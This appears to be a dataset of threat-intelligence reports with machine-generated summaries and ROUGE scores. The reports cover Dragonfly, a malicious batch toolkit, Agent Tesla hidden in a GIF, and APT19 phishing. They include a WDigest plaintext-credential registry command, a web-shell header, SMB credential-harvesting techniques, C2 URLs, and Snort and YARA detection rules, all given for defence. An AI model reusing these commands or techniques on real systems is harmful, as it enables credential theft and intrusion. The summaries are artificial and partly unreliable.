deleted.The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of the compromised system of an intended target.The registry value ""ntdll"" was added to the ""HKEY_USERS\<USER SID>\Software\Microsoft\Windows\CurrentVersion\Run"" key.Persistence Through .LNK File ManipulationThe threat actors manipulated LNK files, commonly known as a Microsoft Window's shortcut file, to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user's credentials are passed through the attempted SMB connection.Four of the observed LNK files were ""SETROUTE.lnk"", ""notepad.exe.lnk"", ""Document.lnk"" and ""desktop.ini.lnk"". These names appeared to be contextual, and the threat actor may use a variety of other file names while using this tactic. Two of the remote servers observed in the icon path of these LNK files were 62.8.193[.]206 and 5.153.58[.]45. Below is the parsed content of one of the LNK files:Parsed output for file: desktop.ini.lnkRegistry ModificationThe threat actor would modify key systems to store plaintext credentials in memory. In one instance, the threat actor executed the following command.reg add ""HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"" /v UseLogonCredential /t REG_DWORD /d 1 /fStage 6: Command and ControlThe threat actors commonly created web shells on the intended targets' publicly accessible email and web servers. The threat actors used three different filenames (""global.aspx, autodiscover.aspx and index.aspx) for two different webshells. The difference between the two groups was the ""public string Password"" field.Beginning Contents of the Web Shell<%@ Page Language=""C"" Debug=""true"" trace=""false"" validateRequest=""false"" EnableViewStateMac=""false"" EnableViewState=""true""%><%@ import Namespace=""System""%><%@ import Namespace=""System.IO""%><%@ import Namespace=""System.Diagnostics""%><%@ import Namespace=""System.Data""%><%@ import Namespace=""System.Management""%><%@ import Namespace=""System.Data.OleDb""%><%@ import Namespace=""Microsoft.Win32""%><%@ import Namespace=""System.Net.Sockets"" %><%@ import Namespace=""System.Net"" %><%@ import Namespace=""System.Runtime.InteropServices""%><%@ import Namespace=""System.DirectoryServices""%><%@ import Namespace=""System.ServiceProcess""%><%@ import Namespace=""System.Text.RegularExpressions""%><%@ Import Namespace=""System.Threading""%><%@ Import Namespace=""System.Data.SqlClient""%><%@ import Namespace=""Microsoft.VisualBasic""%><%@ Import Namespace=""System.IO.Compression"" %><%@ Assembly Name=""System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A""%><%@ Assembly Name=""Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a""%><!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""><script runat = ""server"">public string Password = ""<REDACTED>"",public string z_progname = ""z_WebShell"",...Stage 7: Actions on ObjectivesDHS and FBI identified the threat actors leveraging remote access services and infrastructure such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the infrastructure of staging targets to connect to several intended targets.Internal ReconnaissanceUpon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. DHS observed the threat actors focusing on identifying and browsing file servers within the intended victim's network.Once on the intended target's network, the threat actors used privileged credentials to access the victim's domain controller typically via RDP. Once on the domain controller, the threat actors used the batch scripts ""dc.bat"" and ""dit.bat"" to enumerate hosts, users, and additional information about the environment. The observed outputs (text documents) from these scripts were:admins.txtcompleted_dclist.txtcompleted_trusts.txtcompleted_zone.txtcomps.txtconditional_forwarders.txtdomain_zone.txtenum_zones.txtusers.txtThe threat actors also collected the files ""ntds.dit"" and the ""SYSTEM"" registry hive. DHS observed the threat actors compress all of these files into archives named ""SYSTEM.zip"" and ""comps.zip"".The threat actors used Windows' scheduled task and batch scripts to execute ""scr.exe"" and collect additional information from hosts on the network. The tool ""scr.exe"" is a screenshot utility that the threat actor used to capture the screen of systems across the network. The MD5 hash of ""scr.exe"" matched the MD5 of ScreenUtil, as reported in the Symantec Dragonfly 2.0 report.In at least two instances, the threat actors used batch scripts labeled ""pss.bat"" and ""psc.bat"" to run the PsExec tool. Additionally, the threat actors would rename the tool PsExec to ""ps.exe"".The batch script (""pss.bat"" or ""psc.bat"") is executed with domain administrator credentials. The directory ""out"" is created in the user's %AppData% folder. PsExec is used to execute ""scr.exe"" across the network and to collect screenshots of systems in ""ip.txt"". The screenshot's filename is labeled based on the computer name of the host and stored in the target's C:\Windows\Temp directory with a "".jpg"" extension. The screenshot is then copied over to the newly created ""out"" directory of the system where the batch script was executed. In one instance, DHS observed an ""out.zip"" file created.DHS observed the threat actors create and modify a text document labeled ""ip.txt"" which is believed to have contained a list of host information. The threat actors used ""ip.txt"" as a source of hosts to perform additional reconnaissance efforts. In addition, the text documents ""res.txt"" and ""err.txt"" were observed being created as a result of the batch scripts being executed. In one instance, ""res.txt"" contained output from the Windows' command ""query user"" across the network.Using <Username> <Password>Running -s cmd /c query user on <Hostname1>Running -s cmd /c query user on <Hostname2>Running -s cmd /c query user on <Hostname3>USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME<user1> 2 Disc 1+19:34 6/27/2017 12:35 PMAn additional batch script named ""dirsb.bat"" was used to gather folder and file names from hosts on the network.In addition to the batch scripts, the threat actors also used scheduled tasks to collect screenshots with ""scr.exe"". In two instances, the scheduled tasks were designed to run the command ""C:\Windows\Temp\scr.exe"" with the argument ""C:\Windows\Temp\scr.jpg"". In another instance, the scheduled task was designed to run with the argument ""pss.bat"" from the local administrator's ""AppData\Local\Microsoft\"" folder.The threat actors commonly executed files out of various directories within the user's AppData or Downloads folder. Some common directory names wereChromex64,Microsoft_Corporation,NT,Office365,Temp, andUpdate.Targeting of ICS and SCADA InfrastructureIn multiple instances, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., ""SCADA WIRING DIAGRAM.pdf"" or ""SCADA PANEL LAYOUTS.xlsx"").The threat actors targeted and copied profile and configuration information for accessing ICS systems on the network. DHS observed the threat actors copying Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems. DHS was able to reconstruct screenshot fragments of a Human Machine Interface (HMI) that the threat actors accessed.Cleanup and Cover TracksIn multiple instances, the threat actors created new accounts on the staging targets to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also removed applications they installed while they were in the network along with any logs produced. For example, the Fortinet client installed at one commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.Threat actors cleaned up intended target networks through deleting created screenshots and specific registry keys. Through forensic analysis, DHS determined that the threat actors deleted the registry key associated with terminal server client that tracks connections made to remote systems. The threat actors also deleted all batch scripts, output text documents and any tools they brought into the environment such as ""scr.exe"".Detection and ResponseIOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlists to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these threat actors.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actor TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.Network Signaturesalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)"", sid:42000000, rev:1, flow:established,to_server, content:""/aspnet_client/system_web/4_0_30319/update/"", http_uri, fast_pattern:only, classtype:bad-unknown, metadata:service http,)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/img/bson021.dat'"", sid:42000001, rev:1, flow:established,to_server, content:""/img/bson021.dat"", http_uri, fast_pattern:only, classtype:bad-unknown, metadata:service http,)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/A56WY' (Callback)"", sid:42000002, rev:1, flow:established,to_server, content:""/A56WY"", http_uri, fast_pattern, classtype:bad-unknown, metadata:service http,)alert tcp any any -> any 445 (msg:""SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)"", sid:42000003, rev:1, flow:established,to_server, content:""|FF|SMB|75 00 00 00 00|"", offset:4, depth:9, content:""|08 00 01 00|"", distance:3, content:""|00 5c 5c|"", distance:2, within:3, content:""|5c|AME_ICON.PNG"", distance:7, fast_pattern, classtype:bad-unknown, metadata:service netbios-ssn,)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)"", sid:42000004, rev:1, flow:established,to_server, content:""/ame_icon.png"", http_uri, fast_pattern:only, content:""OPTIONS"", nocase, http_method, classtype:bad-unknown, metadata:service http,)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'"", sid:42000005, rev:1, flow:established,to_server, content:""User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip"", http_header, fast_pattern:only, pcre:""/\.(?:aspx|txt)\?[a-z0-9]{3}=[a-z0-9]{32}&/U"", classtype:bad-unknown, metadata:service http,)alert tcp $EXTERNAL_NET [139,445] -> $HOME_NET any (msg:""SMB Server Traffic contains NTLM-Authenticated SMBv1 Session"", sid:42000006, rev:1, flow:established,to_client, content:""|ff 53 4d 42 72 00 00 00 00 80|"", fast_pattern:only, content:""|05 00|"", distance:23, classtype:bad-unknown, metadata:service netbios-ssn,)YARA RulesThis is a consolidated rule set for malware associated with this activity. These rules were written by NCCIC and include contributions from trusted partners.*/rule APT_malware_1{meta:description = ""inveigh pen testing tools & related artifacts""author = ""DHS | NCCIC Code Analysis Team""date = ""2017/07/17""hash0 = ""61C909D2F625223DB2FB858BBDF42A76""hash1 = ""A07AA521E7CAFB360294E56969EDA5D6""hash2 = ""BA756DD64C1147515BA2298B6A760260""hash3 = ""8943E71A8C73B5E343AA9D2E19002373""hash4 = ""04738CA02F59A5CD394998A99FCD9613""hash5 = ""038A97B4E2F37F34B255F0643E49FC9D""hash6 = ""65A1A73253F04354886F375B59550B46""hash7 = ""AA905A3508D9309A93AD5C0EC26EBC9B""hash8 = ""5DBEF7BDDAF50624E840CCBCE2816594""hash9 = ""722154A36F32BA10E98020A8AD758A7A""hash10 = ""4595DBE00A538DF127E0079294C87DA0""strings:$s0 = ""file://""$s1 = ""/ame_icon.png""$s2 = ""184.154.150.66""$s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }$s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }$s5 = ""(g.charCodeAt(c)^l[(l[b]+l[e])%256])""$s6 = ""for(b=0,256>b,b++)k[b]=b,for(b=0,256>b,b++)""$s7 = ""VXNESWJfSjY3grKEkEkRuZeSvkE=""$s8 = ""NlZzSZk=""$s9 = ""WlJTb1q5kaxqZaRnser3sw==""$s10 = ""for(b=0,256>b,b++)k[b]=b,for(b=0,256>b,b++)""$s11 = ""fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])""$s12 = ""ps.exe -accepteula \\%ws% -u %user% -p %pass% -s cmd /c netstat""$s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }$s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }$s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }//inveigh pentesting tools$s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }//specific malicious word document PK archive$s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }$s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }$s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }$s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }$s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }$s22 = ""5.153.58.45""$s23 = ""62.8.193.206""$s24 = ""/1/ree_stat/p""$s25 = ""/icon.png""$s26 = ""/pshare1/icon""$s27 = ""/notepad.png""$s28 = ""/pic.png""$s29 = ""http://bit.ly/2m0x8IH""condition:($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)}rule APT_malware_2{meta:description = ""rule detects malware""author = ""other""strings:$api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }$http_push = ""X-mode: push"" nocase$http_pop = ""X-mode: pop"" nocasecondition:any of them}rule Query_XML_Code_MAL_DOC_PT_2{meta:name= ""Query_XML_Code_MAL_DOC_PT_2""author = ""other""strings:$zip_magic = { 50 4b 03 04 }$dir1 = ""word/_rels/settings.xml.rels""$bytes = {8c 90 cd 4e eb 30 10 85 d7}condition:$zip_magic at 0 and $dir1 and $bytes}rule Query_Javascript_Decode";The report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. The ITSecurity report summarizes the tactics used by threat actors to collect information needed for targeted spearphishing attempts. The threat actors used compromised staging targets to download the source code for several intended targets' websites. Additionally, the threat actors attempted to remotely access infrastructure such as corporate webbased email and virtual private network (VPN) connections. Throughout the spearphishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a remote server using the Server Message Block (SMB) protocol. This request authenticates the client with the server, sending the user's credential hash to the remote server before retrieving the requested file. After obtaining a credential hash, the threat actors can use passwordcracking techniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use singlefactor authentication. Additionally, approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and reference malicious content. The threat actors used spearphishing emails to target staging targets. The emails used malicious Microsoft Word attachments that appeared to be legitimate resumes or curricula vitae (CVs) for industrial control systems personnel, and invitations and policy documents to entice the user to open the attachment. Once on the intended target's network, the threat actors used privileged credentials to access the domain controller typically via RDP;en;{'r': 0.1077613855035279, 'p': 0.9545454545454546, 'f': 0.19365994054009916};{'r': 0.06910443136039665, 'p': 0.8643410852713178, 'f': 0.1279770431053093};{'r': 0.1077613855035279, 'p': 0.9545454545454546, 'f': 0.19365994054009916}
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;Here is another interesting file that I found while hunting. It is a malicious Windows batch file (.bat) which helps to exploit a freshly compromised system (or... to be used by a rogue user). I don't have a lot of information about the file origin, I found it on VT (SHA256: 1a611b3765073802fb9ff9587ed29b5d2637cf58adb65a337a8044692e1184f2)[1]. The script is very simple and relies on standard windows system tools and external utilities downloaded when neede.Here is an overview of the available options. This should give you a good overview of the batch capabilities:Exploitation - Add User Account - Show/hide User Account - Enable Telent Service - Enable Psexec Service - Enable Remote Desktop Service - Remote Login bypass backdoor (setch.exe or utilman.exe) - EternalBlue - MS1710-Psexec Backdoor - Meterpreter - Cmd_shell - Vnc_Powershell - Winvnc - JRrat - Download/Execute ps1_script - Download/Execute - Post_exploits_script command shell - Persis - Ammyy Admin Trojan - Radmin Gather - Mimikatz - Mimikittenz - Hashdump - Wifi Password Dump - Sherlock (Local privilege escalation vulnerabilities Scanner) - Chrome Passwd Dump - Firefox Passwd Dump - Powerup (Vulns Founder) - Get System info - Get IPAddress - Arp Scan - Port Scanner - Get Shares List - Get Net View - Netstat - Get Process - Scan MS17-010 Vulnerablity - MS1710-Psexec_Scanner - Port Forword Privsec - MS11-046 - Invoke-BypassUAC - Invoke-WScriptBypassUAC - Invoke-MS16032 - Invoke-MS16135 - Invoke-EventVwrBypass - Invoke-EnvBypass - Invoke-FodHelperBypass - Invoke-SDCLTBypass - Invoke-PsUACme - UAC-TokenMagic - EventVwrBypass (Win=7,8,8.1,10) Tools - Install Python27 - Install Ruby187 Proxy Tunnel - Setup Proxy Tunnle - Delete Proxy Tunnle - Show All Proxy Tunnle UpdateNote the numerous typo errors (I left them as is). The script is a good example of demonstrating how easy it is to interact with a system only from a .bat file. Manipulation of users, registry keys, network, etc. The script has an update feature that fetches files from hxxp://remotebot.000webhostapp[.]com/powershellbot/. Many tools are also fetched from a GitHub repository[2] when needed.[1] https://www.virustotal.com/intelligence/search/?query=1a611b3765073802fb9ff9587ed29b5d2637cf58adb65a337a8044692e1184f2[2] https://github.com/cyberhunter00/Xavier Mertens (@xme)ISC Handler - Freelance Security ConsultantPGP Key;This is a malicious Windows batch file (.bat) which helps to exploit a freshly compromised system (or... to be used by a rogue user). The script has an update feature that fetches files from hxxp://remotebot.000webhostapp[.]com/powershellbot/. Many tools are also fetched from a GitHub repository[2] when needed.[1] https://www.virustotal.com/intelligence/search/?query=1a611b3765073802fb9ff9587ed29b5d2637cf58adb65a337a8044692e1184f2[2] https://github.com/cyberhunter00/Xavier Mertens (@xme)ISC Handler Freelance Security ConsultantPGP Key;en;{'r': 0.2602739726027397, 'p': 1.0, 'f': 0.4130434749834594};{'r': 0.18471337579617833, 'p': 0.9508196721311475, 'f': 0.3093333306092089};{'r': 0.2602739726027397, 'p': 1.0, 'f': 0.4130434749834594}
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;"IntroductionOn Wednesday 2018-08-01, @dvk01uk from myonlinesecurity.co.uk tweeted about a recent example of malicious spam (malspam) pushing malware (link to tweet). In recent weeks, this type of malspam has been pushing malware using the Agent Tesla keystroke logger. It looks like Agent Tesla is still involved with today's malspam, but this time, it's not so straight-forward. An Agent Tesla binary was found hiding in an animated gif.Today's diary examines the malspam, infection traffic, and associated malware.The email and my infected lab hostThe email seems like a typical example of mass-distribution malspam. It has a spoofed sender's address, but it isn't very convincing as an actual DHL email. Header information follows:Received: from server.paperattention.com ([162.241.238.78])From: ""DHL Express International "" <dhlexpress@paperattention.com>Subject: Arrival Notice For BL - 01/08/2018 / Vessel - DHL ATLANTICDate: 01 Aug 2018 18:07 UTCShown above: Screenshot of the fake DHL email.The link returned a zip archive that contained a file named ""Arrival Notification.exe"" which looks like ""Arrival Notification"" when the file extensions are hidden (a default setting for Microsoft Windows). In my lab host, double-clicking Arrival Notification.exe caused it to copy itself to the user's AppData\Roaming directory. This malware was made persistent through a script file in the Windows Startup folder.Shown above: Downloading malware from link in the email.Shown above: Malware made persistent on my infected lab host.The trafficNetwork traffic consisted of the URL from the email, which redirected to a different URL to deliver the zip archive. After that, I saw an HTTP request to mydocuments1.is that returned an animated gif. The final line of infection traffic was an IP address check by my infected lab host to checkip.dyndns.org.Shown above: Traffic from the infection filtered in Wireshark.IP address checks may be suspicious, but they are not inherently malicious. My suggested block list based on this infection traffic is:hxxp://www.rebrand.ly/dokom91ceehxxps://a.doko.moe/bfmcuy.zipAny URL to mydocuments1.isThe animated gifThe HTTP request to mydocuments1.is returned an animated gif, which is somewhat strange. This gif was provided to Didier Stevens, who quickly found and extracted two malware binaries from it--a Windows EXE file and a Windows DLL file. According to Didier, the malware binaries were appended to the end of the gif. I reviewed the gif in a hex editor and found the PE headers for both files. It was pretty easy to carve out the binaries based on that.Shown above: An animated gif of me reviewing the animated gif in a browser (I call it ""gifception"").Shown above: Reviewed the gif in a hex editor and found the start of the 1st malware binary.Shown above: Start of the 2nd malware binary when reviewing the gif in a hex editor.Malware and artifactsThe following files are associated with this infection:SHA256 hash: 7a8e7f7cd18c0f9e74c36fb792b46ca67a20e0851caa4a21a0f341debc23e7d9File size: 333,431 bytesFile name: bfmcuy.zipFile location: hxxps://a.doko.moe/bfmcuy.zipFile description: Zip archive downloaded from link in the malspamSHA256 hash: a486a258a822173a9e621252853b8eea343d20946252042b28d454aa6db98fe4File size: 895,488 bytesFile name: Arrival Notification.exeFile location after executing: C:\Users\[username]\AppData\Roaming\kYsFdGQwnF.exeFile description: Malware from the downloaded zip archiveSHA256 hash: 96834c98d7c9e58068e78e4f4bf755a87c9c44655b4b2b4097ffc83aa3c61a3dFile size: 176 bytesFile location: C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kYsFdGQwnF.jsFile description: Script file in Windows Startup folder to keep malware persistent after rebootSHA256 hash: 9dea34a4df20f3e2392f92d2f26dad88ba66827269431aa824c9aa8a0b80289bFile size: 641,155 bytesFile location: hxxp://mydocuments1.is/1//T/nw2lAFile description: Animated gif with 2 items of embedded malwareSHA256 hash: 81e882a394af440cea06cb490105efd721ffba30ca88ea92573d2f9ef27d2c86File size: 197,120 bytesFile description: First file extracted from the animated gif - Windows EXESHA256 hash: fda201abced38c6cb1bfb82e0e42f6e48709d5dd8c8a738a4d2d47128464afccFile size: 109,992 bytesFile description: Second file extracted from the animated gif - Windows DLLFinal wordsOutside of the embedded malware in the animated gif, I couldn't find anything unusual in my lab setup. I could not find either items of malware extracted from the gif in my infected lab host, and I didn't see any Agent Tesla-specific traffic during the infection.Criminals have embedded malware in images before, so this is not a new trick. Still, I don't commonly run into this technique among the mass-distribution malware I frequently see. Embedding malware in an animated gif might provide a way to avoid detection by security solutions. As I write this, the gif shows a detection ratio of 3 / 58 in VirusTotal.Shown above: Low detection rate in VirusTotal for gif with embedded malware.As usual, properly-administered and up-to-date Windows hosts are not likely to get infected. System administrators and the technically inclined can also implement best practices like Software Restriction Policies (SRP) or AppLocker to prevent these types of infections.A pcap of the infection traffic, associated malware, and the email example for today's diary can be found here.---Brad Duncanbrad [at] malware-traffic-analysis.net";The ITSecurity report describes a recent example of malicious spam pushing malware using the Agent Tesla keystroke logger. An Agent Tesla binary was found hiding in an animated gif. The email and my infected lab host examined the malspam, infection traffic, and associated malware. Traffic from the infection filtered in Wireshark. IP address checks may be suspicious, but they are not inherently malicious. My suggested block list based on this infection traffic is: hxxp://www.rebrand.ly/dokom91ceehxxps://a.doko.moe/bfmcuy.zip Any URL to mydocuments1.is The animated gif The HTTP request to mydocuments1.is returned an animated gif, which is somewhat strange. Thank you for your diary entry. Your analysis of the malware embedded in the animated gif is thorough and informative.;en;{'r': 0.20052770448548812, 'p': 0.8351648351648352, 'f': 0.32340425219655955};{'r': 0.12269938650306748, 'p': 0.7079646017699115, 'f': 0.20915032427951644};{'r': 0.19788918205804748, 'p': 0.8241758241758241, 'f': 0.3191489330476234}
https://www.mandiant.com/resources/blog/phished-at-the-request-of-counsel;Privileges and Credentials: Phished at the Request of Counsel;"SummaryIn May and June 2017, FireEye observed a phishing campaign targeting at least seven global law and investment firms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government.APT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 2017-0199. Toward the end of May, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload.As of the writing of this blog post, FireEye had not observed post-exploitation activity by the threat actors, so we cannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment firms for competitive economic purposes.This purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection.The EmailsAPT19 phishing emails from this campaign originated from sender email accounts from the ""@cloudsend[.]net"" domain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for more details.The AttachmentsAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial exploits. The following sections describe the two methods in further detail.RTF AttachmentsThrough the exploitation of the HTA handler vulnerability described in CVE-2017-1099, the observed RTF attachments download hxxp://tk-in-f156.2bunny[.]com/Agreement.doc. Unfortunately, this file was no longer hosted at tk-in-f156.2bunny[.]com for further analysis. Figure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to hxxp://tk-in-f156.2bunny[.]com/Agreement.doc.Figure 1: RTF PCAPXLSM AttachmentsThe XLSM attachments contained multiple worksheets with content that reflected the attachment name. The attachments also contained an image that requested the user to ""Enable Content"", which would enable macro support if it was disabled. Figure 2 provides a screenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).Figure 2: Enable macrosOne of the malicious XLSM attachments that we observed contained a macro that:Determined the system architecture to select the correct path for PowerShell Launched a ZLIB compressed and Base64 encoded command with PowerShell. This is a typical technique used by Meterpreter stagers.Figure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).Figure 3: XLSX MacroFigure 4 contains the decoded output of the encoded text.Figure 4: Decoded ZLIB + Base64 payloadThe shellcode invokes PowerShell to issue a HTTP GET request for a random four (4) character URI on the root of autodiscovery[.]2bunny[.]com. The requests contain minimal HTTP headers since the PowerShell command is executed with mostly default parameters. Figure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP headers.Figure 5: GET Request with minimal HTTP headersConverting the shellcode to ASCII and removing the non-printable characters provides a quick way to pull out network-based indicators (NBI) from the shellcode. Figure 6 shows the extracted NBIs.Figure 6: Decoded shellcodeFireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7.Figure 7: Alternate macroThis macro uses Casey Smith's ""Squiblydoo"" Application Whitelisting bypass technique to run the command in Figure 8.Figure 8: Application Whitelisting BypassThe command in Figure 8 downloads and launches code within an SCT file. The SCT file in the payload (MD5: 1554d6fe12830ae57284b389a1132d65) contained the code shown in Figure 9.Figure 9: SCT contentsFigure 10 provides the decoded script. Notice the ""$DoIt"" string, which is usually indicative of a Cobalt Strike payload.Figure 10: Decoded SCT contentsA quick conversion of the contents of the variable ""$var_code"" from Base64 to ASCII shows some familiar network indicators, shown in Figure 11.Figure 11: $var_code to ASCIISecond Stage PayloadOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike BEACON payload, configured with the following parameters:Process Inject Targets: %windir%\syswow64\rundll32.exe %windir%\sysnative\rundll32.exec2_user_agents Mozilla/5.0 (compatible, MSIE 9.0, Windows NT 6.1, Trident/5.0, FunWebProducts, IE0006_ver1,EN_GB)Named Pipes \\%s\pipe\msagent_%xbeacon_interval 60C2 autodiscover.2bunny[.]com/submit.php autodiscover.2bunny[.]com/IE9CompatViewList.xml sfo02s01-in-f2.cloudsend[.]net/submit.php sfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmlC2 Port TCP/80Figure 12 depicts an example of a BEACON C2 attempt from this payload.Figure 12: Cobalt Strike BEACON C2FireEye Product DetectionsThe following FireEye products currently detect and block the methods described above. Table 1 lists the current detection and blocking capabilities by product.Detection Name Product Action Notes SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) HX Detect XSLM Macro launch Gen:Variant.Application.HackTool.CobaltStrike.1 HX Detect XSLM Macro launch Malware Object HX Detect BEACON written to disk Backdoor.BEACON NX Block* BEACON Callback FE_Malformed_RTF EX/ETP/NX Block* RTF Malware.Binary.rtf EX/ETP/NX Block* RTF Malware.Binary EX/ETP/NX Block* RTF Malware.Binary.xlsx EX/ETP/NX Block* XSLMTable 1: Detection review*Appliances must be configured for block mode.RecommendationsFireEye recommends organizations perform the following steps to mitigate the risk of this campaign:Microsoft Office users should apply the patch from Microsoft as soon as possible, if they have not already installed it. Search historic and future emails that match the included indicators of compromise. Review web proxy logs for connections to the included network based indicators of compromise. Block connections to the included fully qualified domain names. Review endpoints for the included host based indicators of compromise.Indicators of CompromiseThe following section provides the IOCs for the variants of the phishing emails and malicious payloads that FireEye has observed during this campaign.Email SendersPressReader <infodept@cloudsend[.]net>Angela Suh <angela.suh@cloudsend[.]net>Ashley Safronoff <ashley.safronoff@cloudsend[.]net>Lindsey Hersh <lindsey.hersh@cloudsend[.]net>Sarah Roberto sarah.roberto@cloudsend[.]netnoreply@cloudsend[.]netEmail Subject LinesMacron Denies Authenticity Of Leak, French Prosecutors Open ProbeMacron Document Leaker Releases New Images, Promises More InformationAre Emmanuel Macron's Tax Evasion Documents Real?Time AllocationVacancy Reportchina paper table and graphresults with zeros - some ready not all finishedMacron Leaks contain secret plans for the islamisation of France and EuropeAttachment NamesMacron_Authenticity.doc.rtfMacron_Information.doc.rtfUS and EU Trade with China and China CA.xlsmTables 4 5 7 Appendix with zeros.xlsmProject Codes - 05.30.17.xlsmWeekly Vacancy Status Report 5-30-15.xlsmMacron_Tax_Evasion.doc.rtfMacron_secret_plans.doc.rtfNetwork Based Indicators 